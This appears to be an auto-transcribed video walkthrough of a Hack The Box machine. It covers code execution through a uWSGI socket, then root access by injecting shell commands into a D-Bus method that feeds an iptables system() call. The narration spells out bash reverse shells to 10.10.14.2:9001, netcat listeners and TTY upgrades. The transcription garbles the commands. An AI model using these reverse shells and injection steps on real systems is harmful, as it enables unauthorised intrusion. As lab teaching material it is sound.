google u-w-s-g-i on the date this was in july of 2018. so i'm guessing this code just works it's just a feature of uwsgi i honestly haven't looked and dug through it to understand if it'll always work or what the use cases is but try this and let's go v do we have v nano uh i'm out of ideas there's probably a way to like cat until eof or something like maybe this i don't know how to do that um maybe that just did it hey i think i did it cd dev shm so let's do cat pipe something in until eof which is end of file and then we pipe all this content in say eof that's going to enter a cat command send it to t dot pi um did not work cat eof2 t dot pi i got pi h oh well enter eof there we go that's how you do it t dot pi sweet what i was going to do is put it in vim down here and then convert to base64 and paste it up here but we didn't have to do that so python t dot pi so we can do dash u actually we want dash m and we're gonna do unix for unix socket and then the address it's going to be temp uws gi dot socket and c for command we can test this out with a ping first so sudo tcp dom ping dash c1 10 10 14 2. no module named bytes so we have this if sysdot version info 3 import bytes we just do python bytes it's already imported so we could probably either do fine dot grep bytes or a fine slash and run it from probably the dist package or whatever or we can just try removing that line so let's see can i remove this without vim oh that'll be so we can do grep bytes so let's see i'm going to copy that and what we're going to do set input b slash d for delete line grep on s is equal to hex and say dash after three so what that did was looked at where s equals hex is and showed me the next three lines and the reason why i want to do that is until i do dash i on the set command it's not going to make any changes and i don't see the import bytes anymore if i cat t.pi and do this we can see that does exist here so i have successfully just removed that line with said so i'm going to add dash i to remove the line python t dot pi let's do with that dash m and everything like that and it sent the payload uh dash n but we didn't get a packet so i don't know if this is working pmi's dab shm test so we created the file we can't test it's www data and it's created by it but that ping command didn't work ping is not found so this docker container doesn't even have ping so that's where that issue just came from uh thankfully we tested code execution another way so let's try over shell so bash dash c bash dash i dev tcp 10 10 14 2 port 9001 zero is that it that's not it uh bash reverse shell zero and one like that there we go that looks better uh it's a simple thing sometimes so nclvnp9001 run this and the rev shell did not work did i do the command right zero and one dash i and ampersand let me reverse the quotes permission denied so we're getting closer um let's see sudo i don't think that's it so instead of having to keep going down here i'm going to use that dash k option so we can play with this shell and see what's going on dev tcp huh probably made a typo somewhere let's just try copying this and running it let's try that without being in a docking container we definitely have an issue under syntax bash c bin let's get rid of bin bash okay rid of everything paste okay what is different between the two commands uh let's see we were trying let's just grab this cherry tree paste go over here copy paste get rid of that oh i put the and on the wrong side of that greater than oh my god exhaustion is a thing when you keep going for so long every now and then you make some mistakes that are just hard to spot sometimes and i'm sure you watching at home you probably saw that and were just like oh my god fix it already but there we go so that works now let's fix it in this code zero at zero direct and one there we go now we had dub dub dub data so now's where it probably gets easier since we just had all that fail um i'm just gonna search up for the dist package so we can copy this cd and then let's just do python i did not um do my tty so when i did python it tried to go into a terminal and when it did that it hung my session so run the reverse shell again we're going to do python dash c import pty pty dot spawn ben bash i think that worked stty raw minus echo f g enter enter again and now we have a proper tty let's go copy that cd here python import dbus and let's do this so we'll do run me is equal to ping dashee 1 10 10 14 2 uh comment let's try running this did not like that run me because i mixed up my quotes as i said fatigue is a thing there we go that looked promising but i wasn't running tcp dump so sudo tcp dump dash i um ton zero icmp and we're running commands so let's change run me to be a reverse shell and thankfully we have a reverse shell already pasted now the question is which one is the correct one i'm hoping it's this one run me looks fine nc lvnp 9001 pseudo oh i think there's a difference between um cali and parrot one of these is either a different kernel option or a different [Music] netcat version oh no it's because i did the dash k there's an option to reuse sockets and linux and that would let me run netcat multiple times but because i have the dash k it's not working i'll show it out once i get a shell so let's go and send the response run me ten ten fourteen two nine thousand one doesn't look like um oh we didn't do a comment at the end and we didn't begin it with a semicolon there we go there's the root shell so that is the box we're going to do something in just a second but i wanted to show the netcat thing llvmp lvmp9001 uh nc localhost 9001 nc localhost 9001 not there so nclvnp 9001 we can listen on that socket again and connect and both these netcats went to different listeners and the reason that works is again if we do ss ln pt that's listen don't do dns show me ports and tcp i think and grep for 9001 nothing's there we do this netcat we now see netcat is listening and then once we connect netcat is no longer listening so the kernel kind of does some magical rewriting to say okay i know this connection this connection gets now mapped to uh some ephemeral port and then it's no longer listening so once the connection happens it doesn't have to keep listening which means we're freed up to listen again but when you do that dash k option it has to kill that ability and we had the reverse shell earlier we were using dash k which killed that ability so let's see the last thing i wanted to show we got to get back to dub dub dub data and we're going to try doing it a slightly different way instead of doing python code i think there's a dbus command we can use the first thing we want to do is examine the bus so we can do bus ctl introspect htb it's dot ouch dot block ouch dot block and the next one is the slashes and we can examine it so looking at the previous we get access denied when we try that because this user doesn't have access to do reading of this bus so looking at this we have the block interface we can set we got ping get machine id let's try block block is this how i do it no don't close window it's not hell so dot block method i think this means string so uh it's confusing how it's block.block um the block is probably in the c code that is actually performing the block like i blocked you from connecting it's not block as in a 64-bit block so that's why that's getting confusing but i think the signature is a string so i think if we do dbus send system print reply the destination is equal to hdb ouch block and then we'll do hdb out block and now we can say what the method is essentially ouch block block string and then same thing here so um tcp dump dash i ton zero dash n icmp if we use sudo that would help so semicolon ping dash c1 10 10 14 2 comment out and that and let's see what happens we get a ping so i'm going to do the term uh i don't have the up air right now and that keeps throwing me off so python dash c import pty pty dot spawn ben bash stty raw minus echo foreground okay now i should have the up and down arrow so let's do this okay that worked let's do our shell bash dash c uh like this bash c bash dash i dev tcp 10 10 14 2 9 000 1 0 and 1 like that ncl vmp 9001 and we have to comment it out did i put a single uh semicolon there we go so i bet if we look at dbos dash server.c the block may make more sense or it won't this is approaching things i'm not familiar with so main method registers the hdb.ouch.block service on dbus so let's see fail to connect fail to install i was looking for like a function or method of block let's see what's up here method block i'm not sure exactly what is going on i need to read a lot more in dbus and i do not do that it's just proving how you can do things and not fully understand them and just reading the code to figure out how the code interacted with the dbos and trying it yourself was enough um i wonder if this has iptables in it at all iptables there we go so when you call the method block it's going to be where is percent s um it's calling iptables pre-routing source percent s which is going to be the ip address and then dropping you so this is where the code execution comes from i just wish i understood how this percent s is being populated right now so let's go to the very top uh host i'm guessing host is going to be uh the ip address eventually so we're initializing that reading the bus message okay so yeah reading bus message host into the variable if we couldn't get the host name uh return fail and going down here let's see command buffer host length command length there print f so the command buffer is going to be the command with the host in it and in the first invitation they just ran system however if debug hang so this code has been added to fork because if you did a reverse shell this iptables command is never finishing and you'd hang the box so what happened was they put this fork in so before running the system command with command buffer it forks out so if the command never returns it doesn't hang the program and that's what that comment is but yep that is how it works so hope you guys enjoyed the video take care and i'll see you all next week